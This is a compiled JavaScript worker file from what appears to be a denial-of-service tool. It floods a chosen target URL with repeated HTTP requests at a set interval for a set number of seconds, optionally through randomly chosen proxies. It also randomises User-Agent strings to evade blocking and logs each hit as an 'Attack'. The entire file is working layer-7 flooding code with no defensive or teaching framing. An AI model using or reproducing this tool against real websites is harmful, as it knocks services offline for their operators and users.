"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const worker_threads_1 = require("worker_threads");
const axios_1 = __importDefault(require("axios"));
//import functions files
const sleep_1 = require("../util/sleep");
const ua_gen_1 = require("../util/ua-gen");
//colors
const red = '\u001b[31m';
const green = '\u001b[32m';
const yellow = '\u001b[33m';
const white = `\u001b[0m`;
function layer7_worker(targetUrl, requestType, proxySelect, interval, time, threads, proxies, currentThread) {
    return __awaiter(this, void 0, void 0, function* () {
        let dosInterval;
        if (proxySelect === "ON") {
            dosInterval = setInterval(() => __awaiter(this, void 0, void 0, function* () {
                const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                const [host, port] = proxy.split(":");
                try {
                    yield (0, axios_1.default)({
                        url: targetUrl,
                        method: requestType,
                        headers: {
                            "User-Agent": (0, ua_gen_1.UAGen)(),
                        },
                        proxy: {
                            host: host,
                            port: parseInt(port)
                        },
                        timeout: 3000,
                    }).then((response) => {
                        if (response.status === 200) {
                            console.log(`${green}✓${white}${proxy.trim()} -> ${targetUrl}`);
                        }
                        else {
                            console.log(`${red}x${white}${proxy.trim()} -> ${targetUrl}`);
                        }
                    });
                }
                catch (error) {
                    if (error.code === "ECONNABORTED") {
                        console.error(`${yellow}Connection time out${white}`);
                    }
                    console.log(`${yellow}△${white}${proxy.trim()} is timed out.`);
                }
            }), interval);
            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                clearInterval(dosInterval);
                yield (0, sleep_1.sleep)(3000);
                console.log(`Thread: ${currentThread} | ✓${time}秒間のDosが終了しました。`);
                if (currentThread === threads) {
                }
            }), time * 1000);
        }
        else {
            dosInterval = setInterval(() => __awaiter(this, void 0, void 0, function* () {
                try {
                    yield (0, axios_1.default)({
                        url: targetUrl,
                        method: requestType,
                        headers: {
                            "User-Agent": (0, ua_gen_1.UAGen)(),
                        },
                        timeout: 3000,
                    }).then((response) => {
                        if (response.status === 200) {
                            console.log(`${green}✓${white}Attack -> ${targetUrl}`);
                        }
                        else {
                            console.log(`${red}x${white}Failed`);
                        }
                    });
                }
                catch (error) {
                    if (error.code === "ECONNABORTED") {
                        console.error(`${yellow}Connection time out${white}`);
                    }
                    else {
                        console.log(`${yellow}△${white} Connection time out.`);
                    }
                }
            }), interval);
            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                clearInterval(dosInterval);
                yield (0, sleep_1.sleep)(3000);
                console.log(`Thread: ${currentThread} | ✓${time}秒間のDosが終了しました。`);
            }), time * 1000);
        }
    });
}
layer7_worker(worker_threads_1.workerData.targetUrl, worker_threads_1.workerData.requestType, worker_threads_1.workerData.proxySelect, worker_threads_1.workerData.interval, worker_threads_1.workerData.time, worker_threads_1.workerData.threads, worker_threads_1.workerData.proxies, worker_threads_1.workerData.currentThread).then(() => {
    worker_threads_1.parentPort === null || worker_threads_1.parentPort === void 0 ? void 0 : worker_threads_1.parentPort.postMessage("done");
}).catch((error) => {
    worker_threads_1.parentPort === null || worker_threads_1.parentPort === void 0 ? void 0 : worker_threads_1.parentPort.postMessage("error:", error.message);
});
